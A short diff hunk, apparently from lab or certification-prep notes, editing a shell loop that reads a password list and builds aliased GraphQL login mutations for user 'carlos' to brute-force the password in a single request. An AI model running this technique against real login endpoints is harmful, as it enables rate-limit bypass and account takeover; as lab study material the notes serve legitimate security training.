@@ -30,7 +30,7 @@ alias_x: login(input: {username: "carlos", password: "BRUTE-FORCE"}) {\n
 
 count=1
 cat pass-bscp.txt | while read i; do 
-  echo -e $text | sed "s/test/$i/" | sed "s/alias_x/alias_$count/"
+  echo -e $text | sed "s/BRUTE-FORCE/$i/" | sed "s/alias_x/alias_$count/"
   let count+=1
 done
 ```
